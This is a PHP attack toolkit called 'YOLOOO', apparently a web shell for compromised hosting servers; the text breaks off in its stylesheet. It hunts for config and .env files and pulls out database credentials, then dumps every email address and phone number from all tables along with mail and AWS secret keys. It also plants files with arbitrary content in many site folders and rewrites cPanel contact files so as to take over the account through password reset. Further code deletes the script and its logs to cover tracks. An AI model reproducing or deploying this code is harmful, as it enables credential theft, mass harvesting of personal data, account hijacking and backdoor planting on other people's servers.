<?php
// ===================
// YOLOOO: File Scanner + DB Dumper + Mass File Creator + cPanel Contact Reset
// ===================

ini_set('memory_limit', '1G');
error_reporting(E_ALL & ~E_NOTICE);

// --- GLOBALS & CONFIG ---
$target_files = [
    'config.php', 'db.php', '.env', 'connect.php','conf.php','dbconn.php','conn.php','db_config.php',
    'wp-config.php', 'configuration.php',
    'config/database.php',
    'database.php', 'settings.php', 'db_connect.php', 'connection.php', 'constants.php', 'env.php',
    'parameters.php', 'settings.inc.php',
    'settings.ini', 'config.ini', 'appsettings.php', 'local.php',
    'settings.local.php', 'database.ini','config.yaml',
    'config.yml',
    'dbconfig.php', 'database.config.php', 'db_settings.php',
    'site_config.php', 'config.dist.php'
];
$result_file = '0_dump_result.txt';
$fail_file   = '0_dump_failed.txt';
$env_result_file = '0_env_path.txt';
$env_dump_file = '0_env_dump.txt';
$valid_conf_file = '0_valid_conf.txt';

// --- Mass File Creator Vars ---
$folders = $errors = $results = [];
$basePath = '';
$fixedFolder = '';
$deepFolders2 = [];
$deepFolders3 = [];
$deepFolders2_one = [];
$ignoreFoldersDefault = ['ssl','tmp','www','access-logs','.cagefs','etc','logs','mail','.cpanel','.trash','public_ftp','public_html','.softaculous','.pki','.config','.cache','.local','.ssh','.git','.svn'];
$ignoreFolders = $ignoreFoldersDefault;
$currentDirList = [];
$deepScan = $_POST['deepscan'] ?? '0';
$recentFileLog = __DIR__ . '/.recent.json';
$recentFileContents = [];
$checkedFolders = $_POST['folders'] ?? [];

// --- cPanel Contact Reset Vars ---
$site = $_SERVER['HTTP_HOST'] ?? 'localhost';
$ips = $_SERVER['REMOTE_ADDR'] ?? '';
$msg = '';
$cpanel_files = ['.cpanel/contactinfo', '.contactinfo', '.contactemail'];
$backup_suffix = '.bak';

// --- Utility Functions (from all tools) ---
function log_fail($msg) {
    global $fail_file;
    if (strpos($msg, '.env') !== false) {
        $parts = explode(' ', $msg, 2);
        $path = $parts[0];
        file_put_contents($fail_file, "[FAILED ENV] cp '$path' a | $msg\n", FILE_APPEND);
    } else {
        file_put_contents($fail_file, "[FAILED] $msg\n", FILE_APPEND);
    }
}
function log_success($msg) {
    global $result_file, $env_result_file;
    file_put_contents($result_file, "$msg\n", FILE_APPEND);
    if (strpos($msg, '.env') !== false) {
        if (preg_match('/\[EMAIL\] (.+\.env)/i', $msg, $m)) {
            $env_path = $m[1];
            file_put_contents($env_result_file, "$env_path\n", FILE_APPEND);
        } elseif (preg_match('/(\.env[^ ]*)/i', $msg, $m)) {
            $env_path = $m[1];
            file_put_contents($env_result_file, "$env_path\n", FILE_APPEND);
        }
    }
}
function parse_config_text($text) {
    $out = [];
    $lines = explode("\n", $text);
    $cleaned = [];
    foreach ($lines as $line) {
        $line = trim($line);
        if (strpos($line, '//') === 0 || strpos($line, '#') === 0) continue;
        if (preg_match('/^\s*\/\/|^\s*#/', $line)) continue;
        $cleaned[] = $line;
    }
    $text = implode("\n", $cleaned);

    if (preg_match_all('/\$db\s*\[\s*[\'"]default[\'"]\s*\]\s*\[\s*[\'"](hostname|username|password|database)[\'"]\s*\]\s*=\s*[\'"]([^\'"]*)[\'"]\s*;/', $text, $matches, PREG_SET_ORDER)) {
        foreach ($matches as $m) {
            $key = $m[1];
            $val = $m[2];
            if ($key == 'hostname') $out['host'] = $val;
            elseif ($key == 'username') $out['user'] = $val;
            elseif ($key == 'password') $out['pass'] = $val;
            elseif ($key == 'database') $out['db'] = $val;
        }
    }

    if (empty($out['host']) && preg_match('/mysqli_connect\s*\(\s*["\']([^"\']+)["\']\s*,\s*["\']([^"\']+)["\']\s*,\s*["\']([^"\']*)["\']\s*,\s*["\']([^"\']+)["\']\s*\)/i', $text, $m)) {
        $out['host'] = $m[1];
        $out['user'] = $m[2];
        $out['pass'] = $m[3];
        $out['db']   = $m[4];
    } elseif (empty($out['host']) && preg_match('/mysqli_connect\s*\(\s*([^\),]+)\s*,\s*([^\),]+)\s*,\s*([^\),]*)\s*,\s*([^\),]+)\s*\)/i', $text, $m)) {
        $args = [];
        for ($i = 1; $i <= 4; $i++) {
            $v = trim($m[$i]);
            if (preg_match('/^[\'"](.*)[\'"]$/', $v, $mm)) {
                $v = $mm[1];
            } else {
                if (preg_match('/define\s*\(\s*[\'"]'.preg_quote($v, '/').'[\'"]\s*,\s*[\'"]([^\'"]*)[\'"]\s*\)/i', $text, $mm)) {
                    $v = $mm[1];
                } elseif (preg_match('/\$'.preg_quote(ltrim($v, '$'), '/').'\s*=\s*[\'"]([^\'"]*)[\'"]\s*;?/i', $text, $mm)) {
                    $v = $mm[1];
                }
            }
            $args[] = $v;
        }
        $out['host'] = $args[0];
        $out['user'] = $args[1];
        $out['pass'] = $args[2];
        $out['db']   = $args[3];
    }

    $define_patterns = [
        'host' => [
            '/define\s*\(\s*["\']DB_HOST["\']\s*,\s*["\'](.+?)["\']\s*\)/i',
            '/define\s*\(\s*["\']DBhost["\']\s*,\s*["\'](.+?)["\']\s*\)/i',
            '/define\s*\(\s*["\']_DB_SERVER_["\']\s*,\s*["\'](.+?)["\']\s*\)/i',
        ],
        'user' => [
            '/define\s*\(\s*["\']DB_USER["\']\s*,\s*["\'](.+?)["\']\s*\)/i',
            '/define\s*\(\s*["\']DBuser["\']\s*,\s*["\'](.+?)["\']\s*\)/i',
            '/define\s*\(\s*["\']_DB_USER_["\']\s*,\s*["\'](.+?)["\']\s*\)/i',
            '/define\s*\(\s*["\']DB_USERNAME["\']\s*,\s*["\'](.+?)["\']\s*\)/i',
        ],
        'pass' => [
            '/define\s*\(\s*["\']DB_PASSWORD["\']\s*,\s*["\'](.*?)["\']\s*\)/i',
            '/define\s*\(\s*["\']DBpass["\']\s*,\s*["\'](.*?)["\']\s*\)/i',
            '/define\s*\(\s*["\']_DB_PASSWD_["\']\s*,\s*["\'](.*?)["\']\s*\)/i',
            '/define\s*\(\s*["\']DB_PASSWORD["\']\s*,\s*["\'](.*?)["\']\s*\)/i',
            '/define\s*\(\s*["\']DB_PASS["\']\s*,\s*["\'](.*?)["\']\s*\)/i',
        ],
        'db' => [
            '/define\s*\(\s*["\']DB_NAME["\']\s*,\s*["\'](.+?)["\']\s*\)/i',
            '/define\s*\(\s*["\']DBName["\']\s*,\s*["\'](.+?)["\']\s*\)/i',
            '/define\s*\(\s*["\']_DB_NAME_["\']\s*,\s*["\'](.+?)["\']\s*\)/i',
        ],
    ];
    foreach ($define_patterns as $key => $patterns) {
        if (!isset($out[$key]) || $out[$key] === '') {
            foreach ($patterns as $pat) {
                if (preg_match($pat, $text, $m)) {
                    $out[$key] = $m[1];
                    break;
                }
            }
        }
    }

    if (preg_match('/DB_HOST\s*=\s*["\']?([^\r\n"\']+)/i', $text, $m)) $out['host'] = $m[1];
    if (preg_match('/DB_USER(NAME)?\s*=\s*["\']?([^\r\n"\']+)/i', $text, $m)) $out['user'] = $m[2];
    if (preg_match('/DB_PASSWORD\s*=\s*["\']?([^\r\n"\']*)/i', $text, $m)) $out['pass'] = $m[1];
    if (preg_match('/DB_(NAME|DATABASE)\s*=\s*["\']?([^\r\n"\']+)/i', $text, $m)) $out['db'] = $m[2];

    // Add support for candidate style: DBHOST, DBUSER, DBPWD, DBNAME
    if (preg_match('/DBHOST\s*=\s*["\']?([^\r\n"\']+)/i', $text, $m)) $out['host'] = $m[1];
    if (preg_match('/DBUSER\s*=\s*["\']?([^\r\n"\']+)/i', $text, $m)) $out['user'] = $m[1];
    if (preg_match('/DBPWD\s*=\s*["\']?([^\r\n"\']*)/i', $text, $m)) $out['pass'] = $m[1];
    if (preg_match('/DBNAME\s*=\s*["\']?([^\r\n"\']+)/i', $text, $m)) $out['db'] = $m[1];

    if (preg_match('/DBUSER(NAME)?\s*=\s*["\']?([^\r\n"\']+)/i', $text, $m)) $out['user'] = $m[2];
    if (preg_match('/DBPWD\s*=\s*["\']?([^\r\n"\']*)/i', $text, $m)) $out['pass'] = $m[1];
    if (preg_match('/DBNAME(NAME|DATABASE)?\s*=\s*["\']?([^\r\n"\']+)/i', $text, $m)) $out['db'] = $m[2];

    $vars = [
        'host' => ['host_name','server','host', 'dbhost', 'db_host', 'database_host', 'DB_HOST', 'mysql_host', 'hostname', 'sql_host', 'DBhost', 'DBHOST'],
        'user' => ['db_user','user', 'dbusername', 'dbuser', 'db_user_name', 'database_user', 'DB_USERNAME', 'mysql_user', 'username', 'sql_user', 'DBuser', 'DBUSER'],
        'pass' => ['pass','db_pwd', 'dbpassword', 'dbpass', 'db_pass', 'database_password', 'DB_PASSWORD', 'mysql_password', 'password', 'sql_pass', 'DBpass', 'DBPWD'],
        'db'   => ['db_name', 'dbname', 'database_name', 'DB_DATABASE', 'mysql_db', 'database', 'sql_db', 'DBName', 'DBNAME'],
    ];
    foreach ($vars as $key => $names) {
        if (empty($out[$key])) {
            foreach ($names as $var) {
                if (preg_match('/\$?' . preg_quote($var, '/') . '\s*=\s*[\'"]([^\'"]*)[\'"]\s*;?/i', $text, $m)) {
                    $out[$key] = $m[1];
                    break;
                }
            }
        }
    }

    if (!empty($out['host']) && !empty($out['user']) && !empty($out['db'])) {
        if (!isset($out['pass'])) $out['pass'] = '';
        return $out;
    }
    return false;
}
function extract_env_values($text, $source = '') {
    global $env_dump_file;
    $lines = preg_split('/\r\n|\r|\n/', $text);
    $mail_keys = [
        'MAIL_MAILER', 'MAIL_HOST', 'MAIL_PORT', 'MAIL_USERNAME', 'MAIL_PASSWORD',
        'MAIL_ENCRYPTION', 'MAIL_FROM_ADDRESS', 'MAIL_FROM_NAME'
    ];
    $aws_keys = [
        'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'AWS_DEFAULT_REGION', 'AWS_BUCKET', 'AWS_USE_PATH_STYLE_ENDPOINT'
    ];
    $found = [];
    foreach ($lines as $line) {
        $line = trim($line);
        if ($line === '' || strpos($line, '=') === false) continue;
        list($k, $v) = explode('=', $line, 2);
        $k = trim($k);
        $v = trim($v, " \t\n\r\0\x0B\"'");
        if (in_array($k, $mail_keys) || in_array($k, $aws_keys)) {
            if ($v !== '' && strtolower($v) !== 'null' && strtolower($v) !== 'none') {
                $found[$k] = $v;
            }
        }
    }
    if (!empty($found)) {
        $out = '';
        if ($source) $out .= "# $source\n";
        foreach ($mail_keys as $k) if (isset($found[$k])) $out .= "$k={$found[$k]}\n";
        foreach ($aws_keys as $k) if (isset($found[$k])) $out .= "$k={$found[$k]}\n";
        file_put_contents($env_dump_file, $out, FILE_APPEND);
    }
}
function extract_data($mysqli) {
    $re_email = '/[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}(?!\.(jpg|jpeg|png|gif|webp|bmp|svg|tiff|ico))(?![a-z])/i';
    $re_phone = '/\b(\+?\d{10,15})\b/';
    $emails = [];
    $phones = [];
    $res = $mysqli->query("SHOW TABLES");
    if (!$res) return;
    while ($row = $res->fetch_array()) {
        $table = $row[0];
        $fields = [];
        $colres = $mysqli->query("SHOW COLUMNS FROM `$table`");
        if (!$colres) continue;
        while ($col = $colres->fetch_assoc()) {
            $fields[] = $col['Field'];
        }
        $datares = $mysqli->query("SELECT * FROM `$table`");
        if (!$datares) continue;
        while ($data = $datares->fetch_assoc()) {
            foreach ($fields as $f) {
                if (!isset($data[$f])) continue;
                $val = $data[$f];
                if (!is_string($val)) continue;
                if (preg_match_all($re_email, $val, $m)) {
                    foreach ($m[0] as $e) {
                        $e = strtolower($e);
                        if (preg_match('/' . preg_quote($e, '/') . '\.(jpg|jpeg|png|gif|webp|bmp|svg|tiff|ico)\b/i', $val)) continue;
                        if (preg_match('/\.(jpg|jpeg|png|gif|webp|bmp|svg|tiff|ico)$/i', $e)) continue;
                        if (!isset($emails[$e])) {
                            log_success("[EMAIL] $e");
                            $emails[$e] = true;
                        }
                    }
                }
                if (preg_match_all($re_phone, $val, $m)) {
                    foreach ($m[0] as $p) {
                        $p = preg_replace('/\D+/', '', $p);
                        if (!isset($phones[$p])) {
                            log_success("[PHONE] $p");
                            $phones[$p] = true;
                        }
                    }
                }
            }
        }
    }
}
function auto_mode($scan_dir, $target_files) {
    global $valid_conf_file;
    $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($scan_dir, FilesystemIterator::SKIP_DOTS));
    $found_any = false;
    $found_db = false;
    $found_config = false;
    foreach ($rii as $file) {
        if ($file->isDir()) continue;
        $full_path = str_replace('\\', '/', $file->getPathname());
        $relative  = trim(str_replace($scan_dir, '', $full_path), '/');
        $fname = $file->getFilename();
        $match = in_array($relative, $target_files) || in_array($fname, $target_files);
        if (!$match && preg_match('/^env-[a-z0-9\-]+-\d+\.txt$/i', $fname)) {
            $match = true;
        }
        if (!$match) continue;
        $found_any = true;
        $path = $file->getPathname();
        $text = @file_get_contents($path);
        if ($text === false) continue;
        if (strtolower(basename($path)) === '.env') {
            file_put_contents('0_env_path.txt', "$path\n", FILE_APPEND);
        }
        extract_env_values($text, $path);
        $creds = parse_config_text($text);
        if (!$creds) continue;
        $found_config = true;
        $host = $creds['host'];
        $user = $creds['user'];
        $pass = isset($creds['pass']) ? $creds['pass'] : '';
        $db   = $creds['db'];
        try {
            $mysqli = new mysqli($host, $user, $pass, $db);
            if ($mysqli->connect_error) {
                log_fail("$path | DB CONNECT ERROR: " . $mysqli->connect_error);
                continue;
            }
        } catch (mysqli_sql_exception $e) {
            log_fail("$path | EXCEPTION: " . $e->getMessage());
            continue;
        }
        $found_db = true;
        file_put_contents($valid_conf_file, "$path\n", FILE_APPEND);
        extract_data($mysqli);
        $mysqli->close();
    }
    if (!$found_any) {
        echo "<div class='alert error'>Auto scan gagal: Tidak ada file config target ditemukan di direktori yang dipilih.</div>";
    } elseif (!$found_config) {
        echo "<div class='alert error'>Auto scan gagal: Tidak ada file config yang berhasil diparse menjadi kredensial database.</div>";
    } elseif (!$found_db) {
        echo "<div class='alert error'>Auto scan gagal: Tidak ada koneksi database yang berhasil. Cek log gagal untuk detail.</div>";
    } else {
        echo "<div class='alert success'>Auto scan done.</div>";
    }
    show_result_link('0_dump_result.txt', 'Result Log');
    show_result_link('0_dump_failed.txt', 'Fail Log');
    show_result_link('0_env_path.txt', 'Env Results');
    show_result_link('0_env_dump.txt', 'Env Dump');
    show_result_link('0_valid_conf.txt', 'Valid Configs');
}
function manual_mode($config_text) {
    global $valid_conf_file;
    extract_env_values($config_text, 'manual_input');
    $creds = parse_config_text($config_text);
    if (!$creds) {
        echo "<div class='alert error'>Gagal parse config dari input manual. Pastikan format dan isinya benar.</div>";
        return;
    }
    $host = $creds['host'];
    $user = $creds['user'];
    $pass = isset($creds['pass']) ? $creds['pass'] : '';
    $db   = $creds['db'];
    echo "<div class='config-summary'>";
    echo "<b>Config parsed:</b><br>";
    echo "<span class='config-label'>Host:</span> <span class='config-value'>".htmlspecialchars($host)."</span><br>";
    echo "<span class='config-label'>User:</span> <span class='config-value'>".htmlspecialchars($user)."</span><br>";
    echo "<span class='config-label'>Pass:</span> <span class='config-value'>".htmlspecialchars($pass)."</span><br>";
    echo "<span class='config-label'>DB:</span> <span class='config-value'>".htmlspecialchars($db)."</span><br>";
    echo "</div>";
    try {
        $mysqli = new mysqli($host, $user, $pass, $db);
        if ($mysqli->connect_error) {
            log_fail("[Manual Input] DB CONNECT ERROR: " . $mysqli->connect_error);
            echo "<div class='alert error'>Gagal connect ke database: ".htmlspecialchars($mysqli->connect_error)."</div>";
            return;
        }
    } catch (mysqli_sql_exception $e) {
        log_fail("[Manual Input] EXCEPTION: " . $e->getMessage());
        echo "<div class='alert error'>Exception saat connect DB: ".htmlspecialchars($e->getMessage())."</div>";
        return;
    }
    file_put_contents($valid_conf_file, "[Manual Input]\n", FILE_APPEND);
    extract_data($mysqli);
    $mysqli->close();
    echo "<div class='alert success'>Manual mode selesai. Cek hasil di log.</div>";
    show_result_link('0_dump_result.txt', 'Result Log');
    show_result_link('0_dump_failed.txt', 'Fail Log');
    show_result_link('0_env_path.txt', 'Env Results');
    show_result_link('0_env_dump.txt', 'Env Dump');
    show_result_link('0_valid_conf.txt', 'Valid Configs');
}
function delete_script() {
    $files = [basename(__FILE__)];
    foreach ($files as $f) {
        if (file_exists($f)) @unlink($f);
    }
    echo "<div class='alert error'>Script Deleted.</div>";
}
function delete_files_only() {
    $files = ['0_dump_result.txt', '0_dump_failed.txt', '0_env_path.txt', '0_env_dump.txt', '0_valid_conf.txt'];
    foreach ($files as $f) {
        if (file_exists($f)) @unlink($f);
    }
    echo "<div class='alert error'>Results Deleted.</div>";
}
function show_result_link($file, $label) {
    if (file_exists($file) && filesize($file) > 0) {
        echo "<div class='result-link'><a href=\"" . htmlspecialchars($file) . "\" target=\"_blank\">📥 $label</a></div>";
    }
}

// --- Mass File Creator Functions ---
function add_recent_file($path) {
    global $recentFileLog;
    $list = [];
    if (file_exists($recentFileLog)) {
        $list = json_decode(file_get_contents($recentFileLog), 1) ?: [];
    }
    $list[] = $path;
    file_put_contents($recentFileLog, json_encode($list));
}
function delete_file_like_rm($file) {
    if (is_file($file) || is_link($file)) {
        if (@unlink($file)) return true;
        if (function_exists('system')) {
            @system('rm -f ' . escapeshellarg($file));
            if (!file_exists($file)) return true;
        }
        if (@unlink($file)) return true;
        return false;
    } elseif (is_dir($file)) {
        $files = array_diff(scandir($file), ['.','..']);
        foreach ($files as $f) {
            delete_file_like_rm("$file/$f");
        }
        if (@rmdir($file)) return true;
        if (function_exists('system')) {
            @system('rm -rf ' . escapeshellarg($file));
            if (!file_exists($file)) return true;
        }
        if (@rmdir($file)) return true;
        return false;
    }
    return false;
}
function delete_recent_files(&$results) {
    global $recentFileLog;
    if (!file_exists($recentFileLog)) {
        $results[] = "No recent files to delete.";
        return;
    }
    $list = json_decode(file_get_contents($recentFileLog), 1) ?: [];
    $deleted = 0;
    foreach ($list as $f) {
        if (file_exists($f) && is_file($f)) {
            if (delete_file_like_rm($f)) $deleted++;
        }
    }
    @unlink($recentFileLog);
    $results[] = $deleted ? "Deleted $deleted recent file(s)." : "No recent files deleted.";
}
function read_recent_files(&$recentFileContents, &$results) {
    global $recentFileLog;
    if (!file_exists($recentFileLog)) {
        $results[] = "No recent files to read.";
        return;
    }
    $list = json_decode(file_get_contents($recentFileLog), 1) ?: [];
    foreach ($list as $f) {
        if (file_exists($f) && is_file($f)) {
            $recentFileContents[] = [
                'path' => $f,
                'content' => @file_get_contents($f)
            ];
        }
    }
    if (!$recentFileContents) {
        $results[] = "No recent files found or readable.";
    }
}

// --- cPanel Contact Reset Functions ---
function get_user_home() {
    if (function_exists('posix_getpwuid') && function_exists('posix_getuid')) {
        $info = posix_getpwuid(posix_getuid());
        if (isset($info['dir'])) return rtrim($info['dir'], '/');
    }
    if (getenv('HOME')) return rtrim(getenv('HOME'), '/');
    if (isset($_SERVER['HOME'])) return rtrim($_SERVER['HOME'], '/');
    $user = get_current_user();
    if ($user && is_dir('/home/' . $user)) return '/home/' . $user;
    return null;
}
$home = get_user_home();
$user = $home ? basename($home) : get_current_user();
function backup_files($home, $files, $backup_suffix) {
    foreach ($files as $file) {
        $path = $home . '/' . $file;
        $bak = $path . $backup_suffix;
        if (is_file($path) && !is_file($bak)) {
            @copy($path, $bak);
        }
    }
}
function restore_files($home, $files, $backup_suffix) {
    foreach ($files as $file) {
        $path = $home . '/' . $file;
        $bak = $path . $backup_suffix;
        if (is_file($bak)) {
            @copy($bak, $path);
            @unlink($bak);
        }
    }
}
function delete_files($home, $files) {
    foreach ($files as $file) {
        $path = $home . '/' . $file;
        if (is_file($path)) {
            @unlink($path);
        }
    }
}

// --- Helper for random 5-char a-z string ---
function random_name_5() {
    $letters = 'abcdefghijklmnopqrstuvwxyz';
    $out = '';
    for ($i = 0; $i < 5; $i++) {
        $out .= $letters[random_int(0, 25)];
    }
    return $out;
}

// --- Routing/Action for all tools ---
$default_scan_dir = getcwd() . '/';
$scan_dir = $default_scan_dir;
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['scan_dir'])) {
    $scan_dir = trim($_POST['scan_dir']);
    if ($scan_dir === '') $scan_dir = $default_scan_dir;
}
$scan_only_dir = getcwd();
if (isset($_GET['scanonly_dir'])) {
    $input_dir = trim($_GET['scanonly_dir']);
    if ($input_dir !== '' && is_dir($input_dir)) {
        $scan_only_dir = realpath($input_dir);
    }
}
if (isset($_GET['view']) && is_file($_GET['view'])) {
    echo "<pre style='background:#222;color:#eee;padding:15px;border-radius:8px;max-width:90vw;overflow:auto;'>";
    echo htmlspecialchars(file_get_contents($_GET['view']));
    echo "</pre>";
    exit;
}

// --- Mass File Creator POST handler ---
$massFileCopyBox = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $basePath = isset($_POST['basepath']) ? rtrim(trim($_POST['basepath']), '/') : '';
    $fixedFolder = isset($_POST['fixedfolder']) ? trim($_POST['fixedfolder']) : '';
    if (isset($_POST['ignorefolders'])) {
        $customIgnore = trim($_POST['ignorefolders']);
        if ($customIgnore !== '') {
            $ignoreFolders = array_filter(array_map('trim', explode(',', $customIgnore)));
        }
    }
    if (isset($_POST['scan'])) {
        if ($basePath === '') $errors[] = "Base path cannot be empty.";
        elseif (!is_dir($basePath)) $errors[] = "Base path '$basePath' not found or not a directory.";
        else {
            if ($deepScan === '2') {
                foreach (scandir($basePath) as $i) {
                    if ($i === '.' || $i === '..' || strpos($i, '.') === 0 || in_array($i, $ignoreFolders)) continue;
                    $p1 = "$basePath/$i";
                    if (is_dir($p1)) {
                        foreach (scandir($p1) as $j) {
                            if ($j === '.' || $j === '..' || strpos($j, '.') === 0 || in_array($j, $ignoreFolders)) continue;
                            $p2 = "$p1/$j";
                            if (is_dir($p2)) {
                                $deepFolders2[] = "$i/$j";
                            }
                        }
                    }
                }
                if (!$deepFolders2) $errors[] = "No 2-level subfolders found in base path '$basePath'.";
            } elseif ($deepScan === '2one') {
                foreach (scandir($basePath) as $i) {
                    if ($i === '.' || $i === '..' || strpos($i, '.') === 0 || in_array($i, $ignoreFolders)) continue;
                    $p1 = "$basePath/$i";
                    if (is_dir($p1)) {
                        $found = false;
                        foreach (scandir($p1) as $j) {
                            if ($j ==='.' || $j === '..' || strpos($j, '.') === 0 || in_array($j, $ignoreFolders)) continue;
                            if ($j === 'cgi-bin' || $j === '.well-known') continue;
                            $p2 = "$p1/$j";
                            if (is_dir($p2) && is_readable($p2)) {
                                $deepFolders2_one[] = "$i/$j";
                                $found = true;
                                break;
                            }
                        }
                    }
                }
                if (!$deepFolders2_one) $errors[] = "No 2-level (one per parent) subfolders found in base path '$basePath'.";
            } elseif ($deepScan === '3') {
                foreach (scandir($basePath) as $i) {
                    if ($i === '.' || $i === '..' || strpos($i, '.') === 0 || in_array($i, $ignoreFolders)) continue;
                    $p1 = "$basePath/$i";
                    if (is_dir($p1)) {
                        foreach (scandir($p1) as $j) {
                            if ($j === '.' || $j === '..' || strpos($j, '.') === 0 || in_array($j, $ignoreFolders)) continue;
                            $p2 = "$p1/$j";
                            if (is_dir($p2)) {
                                foreach (scandir($p2) as $k) {
                                    if ($k === '.' || $k === '..' || strpos($k, '.') === 0 || in_array($k, $ignoreFolders)) continue;
                                    $p3 = "$p2/$k";
                                    if (is_dir($p3)) {
                                        $deepFolders3[] = "$i/$j/$k";
                                    }
                                }
                            }
                        }
                    }
                }
                if (!$deepFolders3) $errors[] = "No 3-level subfolders found in base path '$basePath'.";
            } else {
                foreach (scandir($basePath) as $i) {
                    if ($i === '.' || $i === '..' || strpos($i, '.') === 0 || in_array($i, $ignoreFolders)) continue;
                    if (is_dir("$basePath/$i")) $folders[] = $i;
                }
                if (!$folders) $errors[] = "No folders found in base path '$basePath'.";
            }
        }
    }
    if (isset($_POST['create'])) {
        $selectedFolders = $_POST['folders'] ?? [];
        $content = $_POST['content'] ?? '';
        $fixedFolder = isset($_POST['fixedfolder']) ? trim($_POST['fixedfolder']) : '';
        $extension = isset($_POST['extension']) ? trim($_POST['extension']) : 'php';
        if ($basePath === '' || !is_dir($basePath)) $errors[] = "Base path is not valid.";
        if (!$selectedFolders) $errors[] = "Select at least one folder.";
        if (!in_array($extension, ['php','txt','html'])) $errors[] = "Invalid extension.";
        if ($content === '') $errors[] = "File content cannot be empty.";
        $createdUrls = [];
        if (!$errors) foreach ($selectedFolders as $folder) {
            $fullPath = $basePath . '/' . $folder . ($fixedFolder !== '' ? '/' . $fixedFolder : '');
            if (!is_dir($fullPath) && !mkdir($fullPath, 0755, true)) {
                $results[] = "Failed to create folder: $fullPath";
                continue;
            }
            $randname = random_name_5();
            $filePath = "$fullPath/$randname.$extension";
            if (file_put_contents($filePath, $content) !== false) {
                $url = "http://$filePath";
                $results[] = $url;
                $createdUrls[] = $url;
                add_recent_file($filePath);
            } else {
                $results[] = "Failed to create file: $filePath";
            }
        }
        $checkedFolders = $selectedFolders;
        // Add copy box for all created URLs
        if (!empty($createdUrls)) {
            $massFileCopyBox = '<div class="alert info" style="margin-top:18px;">'
                . '<b>All Created File URLs:</b><br>'
                . '<textarea id="massFileCopyBox" style="width:100%;max-width:600px;height:90px;background:#23272b;color:#e0e0e0;border:1px solid #333;border-radius:4px;margin-top:6px;font-size:1em;">'
                . htmlspecialchars(implode("\n", $createdUrls))
                . '</textarea><br>'
                . '<button class="copy-btn" style="margin-top:6px;" onclick="copyFromTextarea(\'massFileCopyBox\', this)">📋 Copy All</button>'
                . '<span class="copied-msg">Copied!</span>'
                . '</div>';
        }
    }
    if (isset($_POST['delete'])) {
        $f = __FILE__;
        if (file_exists($f)) {
            $deletedFile = delete_file_like_rm($f);
            $results[] = $deletedFile ? "This file was deleted: $f" : "Failed to delete this file: $f";
            if (file_exists($recentFileLog)) {
                if (delete_file_like_rm($recentFileLog)) {
                    $results[] = "Recent file log deleted: $recentFileLog";
                } else {
                    $results[] = "Failed to delete recent file log: $recentFileLog";
                }
            }
        } else {
            $results[] = "This file was not found: $f";
        }
    }
    if (isset($_POST['delete_recent'])) {
        delete_recent_files($results);
    }
    if (isset($_POST['readcurrent'])) {
        $dir = getcwd();
        $list = [];
        foreach (scandir($dir) as $item) {
            if ($item === '.' || $item === '..') continue;
            $list[] = $item . (is_dir($dir . '/' . $item) ? '/' : '');
        }
        $currentDirList = $list;
    }
    if (isset($_POST['read_recent'])) {
        read_recent_files($recentFileContents, $results);
    }
}

// --- cPanel Contact Reset POST handler ---
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit'])) {
    $email = trim($_POST['email'] ?? '');
    if (filter_var($email, FILTER_VALIDATE_EMAIL) && $home) {
        backup_files($home, $cpanel_files, $backup_suffix);
        $wr = 'email:' . $email;
        foreach ($cpanel_files as $file) {
            $path = $home . '/' . $file;
            @file_put_contents($path, $wr);
        }
        $parm = 'http://' . $site . ':2082/resetpass?start=1';
        $check = @get_headers($parm);
        if ($check && strpos($check[0], '200') !== false) {
            $link = '<a href="' . $parm . '" target="_blank">' . $parm . '</a>';
        } else {
            $link = $parm . ' (unavailable)';
        }
        $msg = '<div class="alert success">Contact info updated & backup created.<br>' . $link . '<br>User: ' . htmlspecialchars($user) . '</div>';
    } else {
        $msg = '<div class="alert error">Invalid email address or home directory not found.</div>';
    }
} elseif (isset($_GET['self']) && $_GET['self'] === 'destroy' && $home) {
    delete_files($home, $cpanel_files);
    restore_files($home, $cpanel_files, $backup_suffix);
}

// --- Global Script Delete Handler ---
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['delete_script_global'])) {
    delete_script();
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>YOLOOO</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        /* --- Custom Minimalist Styling --- */
        body {
            background: #181c20;
            color: #e0e0e0;
            font-family: 'Segoe UI', Arial, sans-serif;
            margin: 0;
            padding: 0;
        }
        .main-wrap {
            max-width: 800px;
            margin: 40px auto;
            background: #23272b;
            border-radius: 10px;
            box-shadow: 0 2px 16px #000a;
            padding: 0 0 32px 0;
        }
        .header {
            background: #1a73e8;
            color: #fff;
            padding: 28px 0 18px 0;
            text-align: center;
            font-size: 2em;
            font-weight: bold;
            letter-spacing: 1px;
            border-radius: 10px 10px 0 0;
        }
        .tab-bar {display: flex;
            background: #181c20;
            border-bottom: 1px solid #333;
        }
        .tab-btn {
            flex: 1;
            font-size: 1em;
            padding: 12px 0;
            cursor: pointer;
            border: none;
            background: #181c20;
            color: #b0b8c1;
            font-weight: 500;
            transition: background 0.15s, color 0.15s;
            border-bottom: 2px solid transparent;
        }
        .tab-btn.active {
            background: #23272b;
            color: #1a73e8;
            border-bottom: 2px solid #1a73e8;
        }
        .tab-content { display: none; padding: 28px 28px 0 28px; }
        .tab-content.active { display: block; }
        @media (max-width: 700px) {
            .main-wrap { max-width: 99vw; }
            .tab-content { padding: 14px 2vw 0 2vw; }
        }
        .alert {
            border-radius: 5px;
            padding: 10px 16px;
            margin: 14px 0;
            font-size: 1em;
        }
        .alert.error {
            background: #2d1a1a;
            color: #ff6b6b;
            border-left: 4px solid #ff6b6b;
        }
        .alert.success {
            background: #1a2d1a;
            color: #4ade80;
            border-left: 4px solid #4ade80;
        }
        .alert.info {
            background: #1a2333;
            color: #60a5fa;
            border-left: 4px solid #60a5fa;
        }
        .file-list {
            background: #181c20;
            border-radius: 5px;
            padding: 10px 14px;
            font-size: 0.97em;
            margin-bottom: 10px;
            max-height: 300px;
            overflow-y: auto;
        }
        .file-found {
            color: #4ade80;
            font-weight: 500;
        }
        .file-link {
            color: #60a5fa;
            text-decoration: underline;
            font-weight: 500;
        }
        textarea.cmd-box {
            width: 100%;
            max-width: 500px;
            height: 28px;
            resize: none;
            font-family: inherit;
            margin-top: 4px;
            background: #23272b;
            color: #e0e0e0;
            border: 1px solid #333;
